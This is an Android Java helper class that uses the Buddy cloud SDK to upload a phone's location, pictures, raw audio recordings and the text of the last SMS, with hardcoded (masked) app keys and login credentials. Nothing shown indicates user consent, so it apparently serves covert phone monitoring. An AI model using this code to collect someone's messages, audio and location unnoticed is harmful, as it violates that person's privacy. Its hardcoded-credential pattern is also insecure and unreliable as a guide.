package com.gravity.andorid.business.net;

import android.content.Context;

import com.buddy.sdk.Buddy;
import com.buddy.sdk.BuddyCallback;
import com.buddy.sdk.BuddyFile;
import com.buddy.sdk.BuddyResult;
import com.buddy.sdk.models.Picture;
import com.buddy.sdk.models.User;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;

public class BuddyDatabaseHelper {

    private static final String APP_ID = "*************";
    private static final String APP_KEY = "***************************";
    private static final String UserName = "*******";
    private static final String PassWord = "*******";
    private static BuddyDatabaseHelper mInstance;

    public BuddyDatabaseHelper(Context context) {
        Init(context);
    }

    public static BuddyDatabaseHelper getInstance(Context context) {
        if (mInstance == null) {
            mInstance = new BuddyDatabaseHelper(context);
        }
        return mInstance;
    }


    private void Init(Context context) {
        Buddy.init(context, APP_ID, APP_KEY);
    }

    public void addLocation(final String key, String locationToString, final OnRemoveSharedPrefListener listener) {
        Map<String, Object> parameters = new HashMap<String, Object>();
        parameters.put("values", "{'" + key + "': " + locationToString + "}");
        parameters.put("visibility", "App");
        parameters.put("permissions", "User");
        Buddy.<Boolean>put("/metadata/********************", parameters, new BuddyCallback<Boolean>(Boolean.class) {
            @Override
            public void completed(BuddyResult<Boolean> result) {
                if (result.getResult() != null) {
                    if (result.getResult())
                        listener.remove(key);

                }
            }
        });

    }


    public void uploadPicture(final byte[] picture) {

        Buddy.loginUser(UserName, PassWord, new BuddyCallback<User>(User.class) {
            @Override
            public void completed(BuddyResult<User> result) {

                InputStream inputStream = new ByteArrayInputStream(picture);

                Map<String, Object> parameters = new HashMap<String, Object>();
                parameters.put("data", new BuddyFile(inputStream, "image/png"));
                parameters.put("readPermissions", "App");
                parameters.put("writePermissions", "App");
                parameters.put("useExifData", true);

                Buddy.<Picture>post("/pictures", parameters, new BuddyCallback<Picture>(Picture.class) {
                    @Override
                    public void completed(BuddyResult<Picture> result) {
                        // Your callback code here
                    }
                });
            }
        });

    }

    public void uploadAudio(final byte[] bytes) {

        Buddy.loginUser(UserName, PassWord, new BuddyCallback<User>(User.class) {
            @Override
            public void completed(BuddyResult<User> result) {

                InputStream inputStream = new ByteArrayInputStream(bytes);

                Map<String, Object> parameters = new HashMap<String, Object>();
                parameters.put("data", new BuddyFile(inputStream, "pcm"));
                parameters.put("readPermissions", "App");
                parameters.put("writePermissions", "App");

                Buddy.post("/blobs", parameters, new BuddyCallback<Picture>(Picture.class) {
                    @Override
                    public void completed(BuddyResult<Picture> result) {
                        // Your callback code here
                    }
                });

            }
        });

    }

    public void sentLastSms(String sms) {
        Map<String, Object> parameters = new HashMap<String, Object>();
        parameters.put("value", sms);
        parameters.put("visibility", "App");
        parameters.put("permissions", "User");
        Buddy.<Boolean>put("/metadata/bbbbbc.MGttwszpvhfvc/lastSms", parameters, new BuddyCallback<Boolean>(Boolean.class) {
            @Override
            public void completed(BuddyResult<Boolean> result) {
            }
        });

    }

    public interface OnRemoveSharedPrefListener {
        void remove(String key);
    }

}
